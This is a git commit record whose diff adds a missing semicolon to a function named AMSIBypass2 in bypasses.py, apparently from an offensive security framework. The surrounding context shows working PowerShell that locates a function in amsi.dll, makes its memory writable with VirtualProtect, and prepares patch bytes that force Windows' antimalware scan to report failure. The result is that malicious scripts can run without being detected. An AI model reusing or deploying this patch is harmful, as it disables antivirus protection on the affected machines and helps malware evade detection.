f1454b8512e1693962af3454247e6c67dafe6376
Cx01N <anthonyrose88@gmail.com>
2020-04-04 18:53:57 -0400

    Fixed typo in AMSIBypass2

--- lib/common/bypasses.py
+++ lib/common/bypasses.py
@@ -59,7 +59,7 @@ def AMSIBypass2():
     $handle = [Win32.Kernel32]::GetModuleHandle('amsi.dll');
     [IntPtr]$BufferAddress = [Win32.Kernel32]::GetProcAddress($handle, $ABSD);
     [UInt32]$Size = 0x5;
-    [UInt32]$ProtectFlag = 0x40
+    [UInt32]$ProtectFlag = 0x40;
     [UInt32]$OldProtectFlag = 0;
     [Win32.Kernel32]::VirtualProtect($BufferAddress, $Size, $ProtectFlag, [Ref]$OldProtectFlag);
     $buf = [Byte[]]([UInt32]0xB8,[UInt32]0x57, [UInt32]0x00, [Uint32]0x07, [Uint32]0x80, [Uint32]0xC3);
